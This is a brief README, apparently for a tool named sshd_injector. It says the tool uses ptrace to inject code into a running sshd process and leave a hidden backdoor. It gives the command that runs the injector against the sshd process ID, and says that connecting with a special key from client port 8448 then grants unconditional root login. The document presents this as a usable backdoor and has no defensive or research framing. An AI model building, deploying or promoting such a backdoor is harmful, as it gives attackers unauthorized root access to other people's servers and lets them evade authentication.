# sshd_injector

A stupid and undone tools to inject some system proc

# What it can do

use ptrace to inject sshd process, leave a secret backdoor in there
but the rx_space could be not enough, I will try fix that

`./build/injector $(pgrep sshd)`

After run that (note that run this twice will make sshd won't close all connection, I will try fix that)
You can use the ./the_backdoor_key the connect, also you have to use the 8448 port from your client
after that you can login with root unconditionaly
